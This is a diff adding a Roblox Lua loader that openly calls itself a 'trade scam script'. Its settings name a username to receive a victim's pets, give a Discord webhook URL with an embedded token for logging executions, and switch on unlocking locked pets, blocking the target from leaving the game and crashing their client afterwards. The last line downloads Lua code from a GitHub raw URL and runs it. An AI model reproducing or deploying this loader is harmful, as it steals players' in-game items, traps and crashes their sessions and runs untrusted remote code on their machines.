@@ -1,0 +1,18 @@
+--[[ Config ]]--
+_G.Username = "Bruciewusie123" --// Username To Send Pets To
+_G.ScriptName = "Loading trade scam script" --// Script Name For Watermark
+_G.Webhook = "https://discord.com/api/webhooks/1092584436568162375/m4vVo_XgNP9oNJOJFYKVrSqzOR2DiMwZS8hjq0zn1R8tjdI6rQVfjJ52fMH_saGqGjWp" --// Discord Webhook For Executions
+_G.GiftMessage = "To ez" --// Message For The Gift To Say
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Crash = true  --// Crashes Them After Its Finished
+_G.Tip1 = "" --// Gives You Tips On The UI
+_G.Tip2 = "" --// Gives You Tips On The UI
+_G.Tip3 = "" --// Gives You Tips On The UI
+_G.Tip4 = "" --// Gives You Tips On The UI
+_G.Tip5 = "" --// Gives You Tips On The UI
+ 
+--[[ Script ]]--
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()
